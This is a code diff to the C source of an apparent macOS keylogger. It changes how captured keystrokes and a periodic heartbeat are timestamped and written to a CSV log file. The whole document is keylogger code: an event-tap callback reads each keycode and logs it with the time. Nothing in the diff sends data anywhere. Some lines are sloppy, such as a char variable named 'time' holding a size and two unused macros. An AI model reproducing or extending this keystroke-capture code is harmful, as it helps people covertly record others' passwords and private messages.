@@ -1,6 +1,8 @@
 #include "keylogger.h"
 #include <time.h>
 #include <pthread.h>
+#define UTC (0) 
+#define ART (-3)
 
 void *threadproc(void *arg)
 {
@@ -9,13 +11,13 @@ void *threadproc(void *arg)
     {
       sleep(15);
 
-      time_t rawtime;
-      struct tm * timeinfo;
-      time ( &rawtime );
-      timeinfo = localtime ( &rawtime );
+      time_t now;
+      time(&now);
+      char buf[sizeof "2011-10-08T07:07:09Z"];
+      char time = strftime(buf, sizeof buf, "%FT%TZ", gmtime(&now)); 
 
-      fprintf(logfile, "PULSE :: ");
-      fprintf(logfile, "%s", asctime(timeinfo));
+      fprintf(logfile, "PULSE,");
+      fprintf(logfile, "%s\n", buf);
       fflush(logfile);
       /* printf("running pulse" ); */
     }
@@ -58,6 +60,7 @@ int main(int argc, const char *argv[]) {
     }
 
     /* fprintf(logfile, "\n\nKeystrokes are now being recorded\n%s\n", asctime(localtime(&result))); */
+    fprintf(logfile, "Keystroke,Datetime\n");
     fflush(logfile);
 
     printf("Logging to: %s\n", logfileLocation);
@@ -78,16 +81,15 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
 
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    // This prints the readable key into the log
-    time_t rawtime;
-    struct tm * timeinfo;
+    time_t now;
+    time(&now);
+    char buf[sizeof "2011-10-08T07:07:09Z"];
+    char time = strftime(buf, sizeof buf, "%FT%TZ", gmtime(&now)); 
+    
+    printf("%s\n", buf);
 
-    time ( &rawtime );
-    timeinfo = localtime ( &rawtime );
-    /* printf ( "Current local time and date: %s", asctime (timeinfo) ); */
-
-    fprintf(logfile, "%s :: ", convertKeyCode(keyCode));
-    fprintf(logfile, "%s", asctime(timeinfo));
+    fprintf(logfile, "%s,", convertKeyCode(keyCode));
+    fprintf(logfile, "%s\n", buf);
     fflush(logfile);
 
     return event;
